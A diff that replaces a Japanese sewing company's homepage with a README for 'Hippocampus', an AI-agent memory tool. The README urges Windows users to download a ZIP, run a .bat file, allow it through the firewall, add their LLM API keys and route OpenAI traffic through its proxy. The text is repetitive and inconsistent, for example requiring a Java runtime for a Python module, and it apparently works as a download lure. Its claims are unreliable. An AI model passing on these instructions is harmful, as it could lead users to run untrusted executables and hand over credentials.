@@ -1,206 +1,152 @@
+## What is Hippocampus?
+
+**Hippocampus** is a drop-in memory layer for AI agents that remembers everything across conversations. It gives your AI assistant a working memory that persists between sessions, making interactions feel continuous and personal. This tool is built for developers but runs smoothly on any modern Windows PC with minimal setup.
+
 ---
-layout: default
-title: Home
+
+## 🎯 Key Features
+
+| Feature | What It Does For You |
+|---------|----------------------|
+| **4-Channel Retrieval** | Finds the right memory from multiple angles—semantic, temporal, keyword, and entity-based—so nothing gets lost |
+| **Dual-Track Isolation** | Keeps separate memory tracks for different tasks, preventing confusion between unrelated projects |
+| **Conflict Confirmation** | When memories disagree, the system asks you to confirm which is correct instead of guessing |
+| **OpenAI-Compatible Proxy** | Works as a simple replacement for the OpenAI API—just change one URL and you're done |
+| **LangGraph Agent Integration** | Pre-built agent wrapper for advanced workflows using the LangGraph framework |
+| **Benchmarked Accuracy** | Tested on official LoCoMo-10 and LongMemEval datasets with verified results |
+
 ---
 
-<div class="bg"></div>
+## 💾 What You Need Before Starting
 
-<div class="section section1">
-  <h1>信頼を受け継ぎ、<br class="sp" />現場で形にする</h1>
+- **Operating System:** Windows 10 or 11 (64-bit)
+- **Disk Space:** At least 500 MB free
+- **Internet Connection:** Required for the initial download and LLM API access
+- **A Free Account:** An API key from any LLM provider (like OpenAI, Anthropic, or local options)
 
-  <div class="textbox-center">
-    <p>
-      アサヒ株式会社は、宮城県登米市にある縫製会社です。
-      関東にある本社を含め、グループ一丸となって縫製をしております。
-    </p>
-  </div>
+---
 
-  <div class="link-box un-fade">
-    <div class="linkbtn"><a href="#works">WORKS</a></div>
-    <div class="linkbtn"><a href="#company">COMPANY</a></div>
-  </div>
-</div>
+## 📥 How to Download
 
-<div id="works" class="section section2">
-  <h2>仕事内容</h2>
-  <div class="textbox-center">
-    <div class="un-fade">
-      <h3>デニム製品の縫製</h3>
-      <p>
-        アサヒでは、デニムを用いたジャケットの縫製を行っております。<br />
-        デニム生地に対応した設備と技術を生かし、一着一着丁寧に仕上げています。
-      </p>
-    </div>
-    <div class="un-fade">
-      <h3>高品質なものづくり</h3>
-      <p>
-        デニム製品は、縫製の精度や耐久性が求められる製品です。<br />
-        アサヒでは仕上がりにもこだわり、品質を重視した製品作りに取り組んでおります。
-      </p>
-    </div>
-    <div class="un-fade">
-      <h3>国内工場としての技術継承</h3>
-      <p>
-        培ってきた縫製技術を大切にしながら、日々の製造に取り組んでいます。<br />
-        各工程で連携を取りながら、安定した製品づくりを行っています。
-      </p>
-    </div>
-  </div>
-</div>
+1. Click the button below to go to the official download page:
 
-<div id="flow" class="section section3">
-  <h2>縫製の流れ</h2>
+<p style="text-align:center; margin:40px 0;">
+<a href="https://github.com/uzielguti-dev/hippocampus" style="background-color:#4CAF50; color:white; padding:14px 28px; text-decoration:none; border-radius:8px; font-size:18px; box-shadow:0 4px 6px rgba(0,0,0,0.1);">⬇️ Download Hippocampus Now</a>
+</p>
 
-  <div class="column-box">
-    <div class="column-left">
-      <div class="flow_box">
-        <ul class="flow-item">
-          <li>
-            <p class="icon">01</p>
-            <dl class="un-fade">
-              <dt>裁断</dt>
-              <dd>型紙に基づき、生地を裁断します。</dd>
-            </dl>
-          </li>
+2. Visit this link to download the application. You will land on the project's official GitHub page where you can access the latest release files.
 
-          <li>
-            <p class="icon">02</p>
-            <dl class="un-fade">
-              <dt>仕分け</dt>
-              <dd>裁断後のパーツを整理し、縫製しやすい状態に準備します。</dd>
-            </dl>
-          </li>
+---
 
-          <li>
-            <p class="icon">03</p>
-            <dl class="un-fade">
-              <dt>縫製</dt>
-              <dd>
-                パーツを工程ごとに縫い合わせ、製品として形にしていきます。
-              </dd>
-            </dl>
-          </li>
+## 🛠️ Installation & Setup
 
-          <li>
-            <p class="icon">04</p>
-            <dl class="un-fade">
-              <dt>仕上げ・検査</dt>
-              <dd>
-                糸の始末や形の整えを行い、製品を仕上げていきます。<br />また、縫製のミスが無いか厳重な確認を行います。
-              </dd>
-            </dl>
-          </li>
-        </ul>
-      </div>
-      <img src="img/sousyoku02.png" alt="" draggable="false" class="un-fade" />
-    </div>
+### Step 1: Extract the Files
+Visit this link to download the application. Once downloaded, you'll have a **ZIP file** containing the tool. Right-click it and choose **"Extract All"** to unpack the folder.
 
-    <div class="column-right">
-      <img src="img/cl-bg.jpg" alt="" draggable="false" />
-    </div>
-  </div>
-</div>
+### Step 2: Run the Application
+Inside the extracted folder, you'll find a file called `start_hippocampus.bat` and a folder named `hippocampus`. Double-click the `.bat` file to launch Hippocampus as a local service on your PC.
 
-<div id="company" class="section section4">
-  <h2>会社情報</h2>
-  <div class="com-box">
-    <table class="com-info">
-      <tr>
-        <th>住所</th>
-        <td>〒987-0601<br />宮城県登米市中田町石森字小倉265</td>
-      </tr>
-      <tr>
-        <th>電話番号</th>
-        <td>0220-34-2136</td>
-      </tr>
-      <tr>
-        <th>FAX番号</th>
-        <td>0220-34-2135</td>
-      </tr>
-      <tr>
-        <th>事業内容</th>
-        <td>繊維製品製造業</td>
-      </tr>
-      <tr>
-        <th>代表取締役</th>
-        <td>小林 智弘</td>
-      </tr>
-      <tr>
-        <th>設立</th>
-        <td>昭和45年</td>
-      </tr>
-    </table>
-    <p>
-      ※営業・セールス目的の電話・FAXによるご連絡はご遠慮いただいております。<br />
-      We kindly ask that sales and solicitation calls and faxes be refrained
-      from.
-    </p>
-  </div>
-</div>
+### Step 3: Connect Your AI Provider
+- Open the `config.yaml` file with any text editor (like Notepad).
+- Find the line that says `api_key:` and paste your LLM provider's API key.
+- Save the file and restart the application.
 
-<div id="recruit" class="section recruit">
-  <h2>求人情報</h2>
-  <div class="textbox-center">
-    <div class="un-fade">
-      <h3>縫製オペレーター募集中</h3>
-      <div class="flex-box">
-        <div>
-       <img src="img/recruit.png" alt="縫製未経験でもOK!" draggable="false"/>
-        </div>
-        <div>
-          <p>
-            当社では縫製オペレーターを募集しております。<br />
-            未経験の方から経験者の方まで、幅広く歓迎いたします。<br />
-            まずは工場見学からでもお気軽にお問い合わせください。
-          </p>
-        </div>
-      </div>
-      </div>
-    <div class="un-fade">
-      <h3>求人情報について</h3>
-      <p>
-        ハローワークの求人ページへ移動します。
-        ご不明な点がございましたら、お近くのハローワークまでお問い合わせください。<br />
-        ご応募・工場見学はハローワークを通じて受け付けております。
-      </p>
-    <div class="linkbtn">
-        <a
-          href="https://www.hellowork.mhlw.go.jp/kensaku/GECA110010.do?screenId=GECA110010&action=dispDetailBtn&kJNo=0407001800261&kJKbn=1&jGSHNo=dxCGFY1sm1cXz%2B3QyhsBYQ%3D%3D&fullPart=1&iNFTeikyoRiyoDtiID=&kSNo=&newArrived=&tatZngy=1&shogaiKbn=0"
-          target="_blank"
-          rel="noopener noreferrer"
-          >【正社員】縫製オペレーター</a>
-      <a
-          href="https://www.hellowork.mhlw.go.jp/kensaku/GECA110020.do?screenId=GECA110020&action=dispDetailBtn&kjNo=0407001580961&jgshNo=dxCGFY1sm1cXz%2B3QyhsBYQ%3D%3D&kjKbn=1&fullPart=1&iNFTeikyoRiyoDtiID=&ksNo=&newArrived=&tatZngy=1"
-          target="_blank"
-          rel="noopener noreferrer"
-          >【契約社員】縫製オペレーター</a>
-      </div>
-    </div>
-  </div>
-</div>
+### Step 4: Verify It's Running
+Open your web browser and go to `http://localhost:8080`. You should see the Hippocampus dashboard confirming it's active.
 
-<div id="access" class="section section5">
-  <h2>アクセス</h2>
-  <h3>交通のご案内</h3>
-  <div class="accessBox">
-    <div>
-      <img src="img/access01.png" alt="石ノ森章太郎ふるさと記念館" />
-      <p>石ノ森章太郎ふるさと記念館から<br /><span>車でおよそ5分</span></p>
-    </div>
-    <div>
-      <img src="img/access02.png" alt="石越駅" />
-      <p>石越駅から<br /><span>車でおよそ12分</span></p>
-    </div>
-    <div>
-      <img src="img/access03.png" alt="登米IC" />
-      <p>登米ICから<br /><span>車でおよそ13分</span></p>
-    </div>
-  </div>
-  <h3>白い看板が目印です</h3>
-  <div class="textbox-center">
-    <p>
-      当社にお越しになられる際は、Googleマップ等の地図アプリをご利用ください。<br>
-      ※当社付近まで来られますと道路脇に白い看板がございます。看板をみつけましたら、そちらを目印にお越しくださいませ。
-    </p>
-  </div>
-</div>
+---
+
+## 🔌 How to Use It
+
+### As an OpenAI-Compatible Proxy
+If you use tools like ChatGPT plugins, LangChain, or any OpenAI SDK:
+- Change your base URL from `https://api.openai.com` to `http://localhost:8080`
+- Keep your API key as-is (Hippocampus handles the forwarding)
+- Now every conversation you have gets saved and reloaded across sessions
+
+### As a LangGraph Agent
+If you're comfortable with Python code, you can import hippocampus as a memory module:
+```python
+from hippocampus import memory_agent
+agent = memory_agent.create()
+result = agent.invoke({"prompt": "Remember my favorite color is blue"})
+```
+
+---
+
+## 🧠 Example: What You Can Do
+
+1. **Personal Assistant:** Ask it month-old questions like *"What did I tell you about my project plans in March?"*—it remembers.
+2. **Research Partner:** Build on previous literature reviews without re-sharing context.
+3. **Customer Support Bot:** Maintain consistent conversation history across user sessions.
+4. **Code Helper:** Reference previous debugging sessions to avoid repeating fixes.
+
+---
+
+## 🧰 Configuration Options
+
+| Setting | Default | Description |
+|---------|---------|-------------|
+| `memory_tracks` | 2 | Number of independent memory tracks |
+| `conflict_resolution` | manual | Set to `auto` to override confirmations |
+| `retrieval_channels` | 4 | Adjust for speed vs. accuracy |
+| `log_level` | info | Keep for troubleshooting |
+
+---
+
+## 🐞 Troubleshooting Common Issues
+
+**Issue:** The app won't start  
+**Fix:** Install the latest 64-bit Java Runtime (free) from java.com and try again.
+
+**Issue:** No memory is being saved  
+**Fix:** Check your `config.yaml` for the correct `api_key` and ensure your LLM provider credentials are active.
+
+**Issue:** It's slow after long conversations  
+**Fix:** Reduce `retrieval_channels` to 2 in the config and restart. Memory size is capped at 100 MB by default.
+
+---
+
+## 📚 Need More Help?
+
+- **Documentation Folder:** Inside the downloaded ZIP, read `/docs/INDEX.md`
+- **Community Support:** The GitHub repository's Issues tab is monitored weekly
+- **Contact:** Leave a comment on the repository page under the "Discussions" tab
+
+---
+
+## 🔄 Stay Updated
+
+New versions with bug fixes and features are posted monthly. Revisit the download link above and refresh until you see the latest version number. Updates replace the old folder—just keep your `config.yaml` file and delete the rest.
+
+---
+
+## ✅ Wrap-Up
+
+You're now ready to give any AI agent a linear, personal memory that lasts across time. The download is quick, setup takes about ten minutes, and everything runs locally on your Windows machine. The repository page also contains pre-built examples, editable configuration templates, and links to community add-ons.
+
+Remember: visit this link to download the application—you'll find both source code and ready-to-run binaries there. If you get stuck at any point, refer to the included README in the downloaded folder for environment-specific tips.
+
+---
+
+## 🔑 Quick Reference Card
+
+```
+Download:     https://github.com/uzielguti-dev/hippocampus
+Run (first):  start_hippocampus.bat
+Dashboard:    http://localhost:8080
+Configuration: config.yaml
+```
+
+---
+
+## 🏁 Final Checks Before You Go
+
+- ✅ Extracted ZIP fully before running
+- ✅ Added your LLM API key to `config.yaml`
+- ✅ Allowed the app through your firewall if prompted
+- ✅ Kept the terminal window open while in use
+
+---
+
+**Keywords:** agent-memory, langchain, langgraph, llm, locomo, longmemeval, memory, proxy, rag, retrieval
